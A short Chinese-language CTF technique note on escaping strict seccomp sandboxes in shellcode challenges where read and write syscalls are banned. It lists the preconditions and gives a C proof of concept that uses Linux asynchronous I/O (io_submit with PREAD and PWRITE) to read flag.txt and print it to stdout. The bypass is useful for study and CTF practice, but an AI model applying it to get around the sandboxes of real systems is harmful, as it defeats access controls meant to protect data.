这个打法主要针对给了任意 shellcode 执行的沙箱题，题目开启了比较严格的沙箱。

使用条件：

1. 禁用了所有的 read、write 相关函数
2. 至少能使用 open 或 openat 打开文件
3. 程序没有关闭输出流

poc 如下：

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <libaio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    io_context_t ctx = 0;
    io_setup(10, &ctx);

    int fd = open("./flag.txt", O_DIRECT | O_RDONLY);
    char *buf;
    posix_memalign((void**)&buf, 512, 512);

    struct iocb iocb = {
        .data = buf,
        .aio_lio_opcode = IO_CMD_PREAD,
        .aio_fildes = fd,
        .u.c = {
            .buf = buf,
            .nbytes = 512,
            .offset = 0
        }
    };
    struct iocb *iocb_ptr = &iocb;

    io_submit(ctx, 1, &iocb_ptr);

    struct iocb iocb2 = {
        .data = buf,
        .aio_lio_opcode = IO_CMD_PWRITE,
        .aio_fildes = 1,
        .u.c = {
            .buf = buf,
            .nbytes = 512,
            .offset = 0
        }
    };
    struct iocb *iocb_ptr2 = &iocb2;

    io_submit(ctx, 1, &iocb_ptr2);
    close(fd);
    io_destroy(ctx);
    return 0;
}
```